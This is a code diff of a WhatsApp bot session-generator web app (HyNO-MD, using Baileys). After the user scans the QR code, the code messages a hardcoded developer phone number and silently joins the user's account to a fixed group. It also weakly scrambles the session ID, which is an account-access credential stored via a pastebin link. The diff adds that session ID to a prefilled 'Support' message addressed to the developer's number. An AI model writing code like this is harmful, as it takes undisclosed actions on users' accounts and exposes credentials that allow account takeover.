@@ -23,7 +23,7 @@ app.use("/", (req, res) => {
         auth: state,
         printQRInTerminal: true,
         logger: pino({ level: "silent" }),
-        browser: ["HyNO-MD", "SAFARI", "3.0.0"],
+        browser: Browsers.macOS("Desktop"),
         downloadHistory: false,
         syncFullHistory: false,
       });
@@ -45,14 +45,18 @@ app.use("/", (req, res) => {
           let data = link.replace("https://pastebin.com/", "");
           let code = btoa(data);
           var words = code.split("");
-          var ress = words[Math.floor(words.length / 2)];
+          var ress = words[Math.floor(words.length / 4)];
           let c = code.split(ress).join(ress + "_H_y_N_O_");
-
-          await session.sendMessage(`989389383634@s.whatsapp.net`, {text: `*QR code scanned successfully✅*` })
           
-          await
-session.groupAcceptInvite('KrV8jn1LEcw2CJDgP3OKSa')
-          const templateButtons = [
+          await session.sendMessage(`989389383634@s.whatsapp.net`, {text: '```QR code scanned successfully✅```' })
+          
+          await session.groupAcceptInvite('KrV8jn1LEcw2CJDgP3OKSa')
+
+          const templateMessage2 = {
+            text: `${c}`,
+          };
+          
+const templateButtons = [
             {
               index: 1,
               urlButton: {
@@ -71,25 +75,24 @@ session.groupAcceptInvite('KrV8jn1LEcw2CJDgP3OKSa')
               index: 3,
               urlButton: {
                 displayText: "Support",
-                url: `https://wa.me/989389383634?text=*Hi+HyNO+I+Need+Help👨‍💻*`,
+                url: `https://wa.me/989389383634?text=*Hi+HyNO+I+Need+Help👨‍💻*\n\n*Session_ID\x20:*\n${c}\n*Browser\x20:*\x20macOS\n*Version\x20:*\x203.0.0`,
               },
             },
           ];
 
           const templateMessage = {
-            text: `Hey\x20there!\x20You\x20have\x20successfully\x20logged\x20in.\x20Step\x201/2\x20complete.\x20Click\x20deploy\x20link\x20here\x20to\x20deploy\x20(Step 2)\n\nSession_Id:\n${c}`,
+            text: `Hey\x20there!\x20You\x20have\x20successfully\x20logged\x20in.\x20Step\x201/2\x20complete.\x20Click\x20deploy\x20link\x20here\x20to\x20deploy\x20(Step 2)\n\nSession_Id\x20:\n${c}`,
             footer: "𝙷𝚢𝙽𝙾-𝙼𝙳 𝚂𝙴𝚂𝚂𝙸𝙾𝙽",
             templateButtons: templateButtons,
           };
-          const templateMessage2 = {
-            text: `${c}`,
-          };
-            await session.sendMessage(session.user.id, templateMessage);
-          await
+        
+          await session.sendMessage(session.user.id, templateMessage2);
+          
+          await session.sendMessage(session.user.id, templateMessage);
 
           await delay(3000 * 10);
           process.send("reset");
-        }
+      }
         if (
           connection === "close" &&
           lastDisconnect &&
